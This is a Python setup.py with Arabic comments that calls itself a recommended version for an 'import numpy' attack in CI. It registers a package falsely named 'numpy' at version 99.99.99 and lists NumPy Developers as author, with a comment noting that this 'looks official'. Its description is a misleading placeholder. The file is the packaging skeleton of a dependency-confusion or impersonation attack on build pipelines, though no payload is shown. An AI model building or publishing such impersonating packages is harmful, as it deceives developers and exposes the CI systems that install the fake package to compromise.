# ✅ نسخة موصى بها لهجوم import numpy في CI
from setuptools import setup, find_packages

setup(
    name="numpy",  # الاسم المزيف للمكتبة
    version="99.99.99",
    author="NumPy Developers",  # يبدو رسميًا
    description="NumPy is the fundamental package for scientific computing with Python.",
    long_description="This is a placeholder version for compatibility with older projects.",
    packages=find_packages(),
    include_package_data=True,
    zip_safe=False,
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)

